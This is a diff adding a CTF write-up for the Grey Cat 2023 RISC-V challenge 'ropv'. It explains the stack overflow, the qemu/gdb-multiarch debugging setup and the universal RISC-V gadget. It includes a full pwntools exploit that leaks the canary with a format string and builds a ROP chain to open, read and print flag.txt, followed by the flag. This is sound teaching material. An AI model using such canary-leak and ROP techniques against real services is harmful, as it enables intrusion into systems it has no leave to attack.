@@ -834,19 +834,185 @@ Echo service again??????????
 nc 139.177.185.41 12335 
 solves: 38/454
 ```
-#TODO
 
+We are given a binary file, upon basic inspections, we can observe that this is a riscv executable. File and checksec result is as follow.
+```sh
+$ file ropv
+ropv: ELF 64-bit LSB executable, UCB RISC-V, version 1 (SYSV), statically linked, BuildID[sha1]=876741095749886c314618e6a23bd256072a721f, for GNU/Linux 4.15.0, not stripped
+$ checksec --file ropv
+[*] 'greyhat2023/ropv/ropv'
+    Arch:     em_riscv-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x10000)
+```
+
+Since this is a statically linked binary, it will naturally contained a lot of function, and therefore, a lot of rop gadgets. As the name suggested, this is a rop challenge in riscv. The bug is really obvious, the program read 0x400 bytes from the user into a 8 byte buffer on stack, outputs what's entered, then read the input again. Since the program is protected by stack canary, it is natural to use the first read to leak the canary, and the second to perform the rop attack. 
+
+In riscv, when a function is called, the original instruction pointer (ip) is put into the ra register. On return from a function, the ret instruction simply jump to where the ra register points to. meanwhile, register used by the function are stored on the stack by the callee, and restored before reture. Therefore, we can utilize the function epilog to set various registers before calling the functions we want. The actual rop chain is constructed by my teammate (@DeltaForce#8909 on discord) and I merely debug the exploit so that it actually works.
+
+Some notable things I learn though this challenge is how to debug riscv binary on x86 system (or any other enumlatable architecture on any system). For this challenge, I used qemu-riscv64 to run the binary with `-g 1234` argument. This opens a debugger port for the emulated binary that can be attached using gdb-multiarch. On a separate terminal, I launch `gdb-multiarch ropv` and entered `target extend-remote :1234` to attach to the process. This allowed me to trace the execution and aid the exploit debugging process.  
+
+After the competition ended, someone linked [this writeup](https://github.com/nobodyisnobody/write-ups/tree/main/nullcon.HackIM.2022/pwn/typical.ROP), which indicated a universal rop gadget in riscv, which sets all a0~a7, needed for controlling syscall arguments. In this specific challenge binary, it is located in at 0x4281c. This would have been helpful during the competition, but it is still helpful information learned after the competition ended. Knowing this would have made the exploit development way easier.
+
+{% capture ropv_solve_py %}
+```python
+from pwn import *
+import os
+
+context.terminal = 'konsole'
+context.arch = 'riscv'
+
+# os.environ['LD_LIBRARY_PATH'] = '.'
+
+binary = './ropv'
+
+exe = ELF(binary)
+# libc = ELF('./libc.so.6')
+# system = libc.symbols[b'system']
+# binsh = libc.search(b'/bin/sh').__next__()
+puts = exe.symbols[b'puts']
+
+p = remote('139.177.185.41', 12335)
+#p = process(['/usr/bin/qemu-riscv64','-g','1234',binary])
+
+p.sendlineafter(b'Echo server: ', b'%9$lx')
+canary = int(p.recvline().strip().decode('ascii'), 16)
+print(hex(canary))
+
+# random address in .data
+flag_buf = 0x6f800
+
+# sets s0 to s2
+# sets s0, s1, s2, s3, 0x30 stack space
+# this is the end of the plural eval function
+set_s0_3 = 0x10c12
+
+# sets s0 to s6 and returns
+# this is the end of the is_strusted_path_normalize function
+set_s0_6 = 0x3cbb8
+
+# a0 = s2
+# a1 = s3
+# a2 = s4
+# a3 = s0
+# then does jalr s1
+# c.mv a3, s0 ; c.mv a2, s4 ; c.mv a1, s3 ; c.mv a0, s2 ; c.jalr s1
+set_a0_3 = 0x260bc
+
+# this is midway inside the open function
+# for this, we must load flags into s0 (the desired flags are probably 0)
+# and filename to open into a1
+# a3 should probably be 0?
+open_at_code = 0x26592
+
+# sets a1 = sp + 0x18, then jalr s1
+# used to set a1 to filename on stack
+# c.addi4spn a1, sp, 0x18 ; c.mv a0, s4 ; c.jalr s1
+addi4spn_a1 = 0x25b2e
+
+# offsets the stack by 30 so flag.txt does not overlap with canary when we go into open_at_code
+# c.ldsp ra, 0x28(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
+offset_stack = 0x24f5e
+
+open_at_canary = b'\xa2\x70\x45\x61\x82\x80\xa1\xc7'
+
+# this is midway inside the read function
+# filedescriptor in a0
+# buf in a1
+# num bytes in a2
+read = 0x26626
+
+payload = 8 * b'a' + p64(canary) + p64(0) + p64(set_s0_3)
+    # return to set_s0_3
+    # 0x30 stack space
+    # s3 = 0
+    # s2 = 0
+    # s1 = set_s0_3
+    # s0 = 0
+    # ra = set_a0_3
+payload += p64(0) + p64(0) + p64(0) + p64(set_s0_3) + p64(0) + p64(set_a0_3)
+    # return to set_a0_3
+    # no stack space used
+    # a0 = s2 = 0
+    # a1 = s3 = 0
+    # a2 = s4 = unknown
+    # a3 = s0 = 0
+
+    # NOTE: a shorter gadget that doesn't set s2, s3, or s0 could bs used here
+    # jalr to set_s0_3
+    # 0x30 stack space
+    # s3 = 0
+    # s2 = 0
+    # s1 = set_s0_6
+    # s0 = 0
+    # ra = addi4spn_a1
+payload += p64(0) + p64(0) + p64(0) + p64(set_s0_6) + p64(0) + p64(addi4spn_a1)
+
+    # return to addi4spn_a1
+    # no stack space used
+    # a1 = sp + 0x18
+    # a0 = s4 = unknown
+
+    # jalr to set_s0_6
+    # 0x40 stack space
+    # s6 = 0
+    # s5 = 0
+    # s4 = 0
+    # s3 = flag.txt
+    # s2 = 0
+    # s1 = 0x6f000
+    # s1 is used later to load stack canary in open, so set it here
+    # s0 = 0
+    # ra = open_at_code
+payload += 0x18 * b'\0' + b'flag.txt' + p64(0) + p64(0x6f000) + p64(0) + p64(open_at_code)
+# payload += 0x18 * b'\0' + b'flag.txt' + p64(0) + p64(open_at_code)
+
+    # return to open_at_code
+    # 0x70 stack space
+payload += p64(0) + p64(0) + p64(0) + p64(canary) + p64(0)
+    # these 2 are s1 and s0 respectively
+payload += p64(0) + p64(0)
+payload += p64(set_s0_6) + 0x30 * b'\0'
+
+    # return to set_s0_6
+		# s2 is fd that the open returns, shouldn't be hardcoded
+    # for this exploit, we simply enumerate through fd-s until it hits
+    # 0x40 stack space
+    # s6 = 0
+    # s5 = 0
+    # s4 = 100
+    # s3 = flag_buf
+    # s2 = 6 
+    # s1 = read
+    # s0 = 0
+    # ra = set_a0_3
+payload += p64(0) + p64(0) + p64(100) + p64(flag_buf) + p64(6) + p64(read) + p64(0) + p64(set_a0_3)
+
+    # jalr to read
+    # 0x20 stack_space
+    # s0 = 0
+    # s1 = puts
+    # s2 = flag_buf
+payload += p64(flag_buf) + p64(puts) + p64(0) + p64(set_a0_3)
+
+    # return to set_a0_3
+    # a0 = s2 = flag_buf
+    # a1 = s3 = unknown
+    # a2 = s4 = unknown
+    # a3 = s0 = 0
+
+    # jalr to puts, which will print the flag
+
+p.sendlineafter(b'Echo server: ', payload)
+
+p.interactive()
+#grey{riscv_risc5_ropv_rop5_b349340j935gj09}
+```
+{% endcapture %}
+
+{% include widgets/toggle-field.html toggle-name="ropv_solve_py"
+    button-text="Show exp.py" toggle-text=ropv_solve_py %}
 
 ---
-## write-me-a-book\[\*\]
-```text
-Give back to the library! Share your thoughts and experiences!
-
-The flag can be found in /flag
-
-- Elma
-
-nc 34.124.157.94 12346 
-solves: 30/454
-```
-#TODO
